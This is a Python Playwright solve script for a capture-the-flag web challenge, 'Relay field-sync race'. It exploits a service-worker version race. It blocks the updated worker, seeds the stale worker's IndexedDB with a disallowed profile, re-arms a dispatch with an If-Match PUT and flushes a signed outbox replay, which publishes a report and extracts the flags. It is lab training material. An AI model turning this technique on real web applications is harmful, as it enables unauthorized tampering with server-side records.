# solve.py — Relay field-sync race, both objectives
#
# Usage:
#   pip install playwright
#   python solve.py
#
# Set BASE to your instance URL before running.
#
# Objective 1: the sync receipt (reconciliation_receipt) from the service-worker outbox
# Objective 2: the field report package for JOB-3887 (attachments/commissioning-note.txt)
#
# Core idea:
#   The v1 service worker is the only publisher of a v1/"complete" report, and it takes
#   the profile from its OWN IndexedDB. It will only replay a plan whose sync_id is
#   stable between staging and commit, i.e. a v2 plan. But POST /api/runtime/ready
#   resets the server preference to revision 0, leaving the dispatch with no pending
#   work and the plan permanently 409. Re-arming the dispatch with an If-Match PUT
#   after the flip produces the pending revision that makes the v2 plan available.

import json, time, base64, re, zipfile
from playwright.sync_api import sync_playwright

BASE  = "https://web-2790e55dc302521b.web.h7tex.com"   # <- your instance
JOB   = "JOB-3887"
FLAGS = []

# All API traffic must be a same-origin browser fetch():
#  - /api/runtime/ready validates the Sec-Fetch-* headers the browser sets itself
#    (ctx.request / APIRequestContext gets: "Relay sync requires a same-origin
#     browser request")
#  - a service worker only intercepts requests made by a page it controls
#  - do NOT put Sec-Fetch-* in new_context(extra_headers=...); Chrome rejects the
#    forced combination with net::ERR_INVALID_ARGUMENT and the SW silently never
#    registers
FETCH_JS = """async (a) => {
    const opt = { method: a.m, cache: 'no-store', headers: a.h || {} };
    if (a.b !== null) { opt.headers['Content-Type'] = 'application/json'; opt.body = JSON.stringify(a.b); }
    const r = await fetch(a.p, opt);
    let t = ''; try { t = await r.text(); } catch (e) {}
    return { s: r.status, b: t, etag: r.headers.get('ETag') };
}"""

# talk to the active service worker
SWMSG_JS = """async (m) => {
    const r = await navigator.serviceWorker.getRegistration('/');
    const w = navigator.serviceWorker.controller || r?.active;
    if (!w) return { error: 'no worker' };
    const ch = new MessageChannel();
    return new Promise(res => { ch.port1.onmessage = e => res(e.data);
                                setTimeout(() => res({ error: 'timeout' }), m.t);
                                w.postMessage(m, [ch.port2]); });
}"""

B64_JS = """async (u) => {
    const r = await fetch(u, { cache: 'no-store' });
    if (!r.ok) return null;
    const buf = new Uint8Array(await r.arrayBuffer());
    let s = ''; const CH = 0x8000;
    for (let i = 0; i < buf.length; i += CH) s += String.fromCharCode.apply(null, buf.subarray(i, i + CH));
    return btoa(s);
}"""


def main():
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        ctx = browser.new_context(service_workers="allow")

        # Keep the v1 worker in charge. sw-2026.09.24.2.js is a passthrough whose
        # activate handler deletes the v1 caches, expires the outbox and discards the
        # signing key -- once it claims the page, nothing can be replayed.
        ctx.route("**/sw-2026.09.24.2.js",
                  lambda r: r.fulfill(status=404, body="nf", content_type="text/plain"))
        page = ctx.new_page()
        page.set_default_timeout(60000)

        def raw(path, method="GET", body=None, hdr=None, tries=8):
            for _ in range(tries):
                try:
                    return page.evaluate(FETCH_JS, {"p": path, "m": method, "b": body, "h": hdr or {}})
                except Exception:                    # the shell reloads on rollout
                    try:
                        page.wait_for_load_state("domcontentloaded")
                    except Exception:
                        pass
                    time.sleep(0.4)
            return {"s": 0, "b": "", "etag": None}

        def swmsg(msg, timeout=30000, tries=8):
            for _ in range(tries):
                try:
                    return page.evaluate(SWMSG_JS, {**msg, "t": timeout})
                except Exception:
                    time.sleep(0.4)
            return {"error": "eval-fail"}

        def pref():
            r = raw(f"/api/jobs/{JOB}/report-preference")
            try:
                return json.loads(r["b"] or "{}"), r.get("etag")
            except Exception:
                return {}, None

        def report():
            try:
                return json.loads(raw(f"/api/jobs/{JOB}")["b"]).get("job", {}).get("report")
            except Exception:
                return None

        # ---- Step 1: v1 worker up, seed the profile the v2 contract cannot express ----
        page.goto(BASE + "/", wait_until="networkidle")
        for _ in range(60):
            try:
                st = page.evaluate("() => navigator.serviceWorker.getRegistration('/')"
                                   ".then(r => r && r.active ? r.active.state : 'none')")
            except Exception:
                st = "err"
            if st == "activated":
                break
            time.sleep(0.4)
        time.sleep(1.0)
        print("worker:", swmsg({"type": "RELAY_VERSION"}, timeout=6000))

        # normalizeDelivery() reads the profile from here, not from the server
        print("seed IDB:", swmsg({"type": "RELAY_REPORT_PACKAGE_SAVE",
                                  "profile": "complete", "revision": 1}))
        print("PUT v1:  ", raw(f"/api/jobs/{JOB}/report-preference", "PUT",
                               {"contract": "relay.report-package/v1", "profile": "complete"}))

        # flip the release; the shell reloads into v2 but the v1 worker survives.
        # NOTE: this resets the server preference revision to 0.
        print("ready:   ", raw("/api/runtime/ready", "POST"))
        time.sleep(2.5)
        try:
            page.wait_for_load_state("domcontentloaded")
        except Exception:
            pass
        print("meta:    ", raw("/api/meta")["b"])
        p, etag = pref()
        print("pref:    ", json.dumps(p), "etag:", etag)

        # ---- Step 2: re-arm the dispatch. If-Match is mandatory; without it the PUT
        #      returns 422 "report preference contract is invalid" no matter which
        #      contract string you send. The scope value is irrelevant to the final
        #      package -- the worker supplies "complete" from IndexedDB.
        r = raw(f"/api/jobs/{JOB}/report-preference", "PUT",
                {"contract": "relay.report-package/v2", "scope": "record"},
                {"If-Match": etag} if etag else {})
        print("PUT v2:  ", r)
        p, etag = pref()
        rev = p.get("revision") or 0
        print("re-seed: ", swmsg({"type": "RELAY_REPORT_PACKAGE_SAVE",
                                  "profile": "complete", "revision": rev}))

        # ---- Step 3: plan -> staged by the v1 SW -> flush -> signed replay -> publish
        receipt = None
        for i in range(30):
            p, etag = pref()
            cycle = (p.get("dispatch") or {}).get("cycle_id")
            pl = raw("/api/sync/plan", "POST", {"cycle_id": cycle})
            st = swmsg({"type": "RELAY_OUTBOX_STATUS"}, timeout=10000)
            cnt = st.get("count", 0) if isinstance(st, dict) else 0
            print(f"[{i}] plan={pl['s']} rev={p.get('revision')}/{p.get('processed_revision')} "
                  f"snapshot={(p.get('dispatch') or {}).get('snapshot_revision')} outbox={cnt} "
                  f"{(pl['b'] or '')[:60] if pl['s'] != 200 else ''}")
            if cnt > 0:
                rc = st.get("reconciliation_receipt")
                if rc and not receipt:
                    receipt = rc
                    FLAGS.append(("sync receipt (reconciliation_receipt)", rc))
                    print("     receipt:", rc)
                print("     flush: ", swmsg({"type": "RELAY_OUTBOX_FLUSH"}, timeout=60000))
            rep = report()
            if rep:
                print("PUBLISHED:", json.dumps(rep))
                break
            time.sleep(2.0)

        # ---- export -> poll -> unzip ----
        ex = raw(f"/api/jobs/{JOB}/exports", "POST")
        print("export:", ex["s"], (ex["b"] or "")[:160])
        if ex["s"] in (200, 201, 202) and ex["b"]:
            created = json.loads(ex["b"])
            for _ in range(60):
                try:
                    sd = json.loads(raw(created["status_url"])["b"] or "{}")
                except Exception:
                    sd = {}
                if sd.get("status") != "processing":
                    print("status:", json.dumps(sd))
                    if sd.get("package_url"):
                        b64 = None
                        for _ in range(6):
                            try:
                                b64 = page.evaluate(B64_JS, sd["package_url"])
                                break
                            except Exception:
                                time.sleep(0.5)
                        if b64:
                            blob = base64.b64decode(b64)
                            open("field_package.zip", "wb").write(blob)
                            z = zipfile.ZipFile("field_package.zip")
                            print("zip:", len(blob), "bytes ->", z.namelist())
                            text = ""
                            for name in z.namelist():
                                body = z.read(name).decode("utf-8", "replace")
                                print("-" * 50)
                                print("FILE:", name)
                                print(body)
                                text += body
                            for f in re.findall(r"H7CTF\{[^}]+\}", text):
                                FLAGS.append((name, f))
                    break
                time.sleep(0.6)
        browser.close()

    print("\n===== FLAGS =====")
    for src, f in FLAGS:
        print(f"  {f}   <- {src}")


if __name__ == "__main__":
    main()
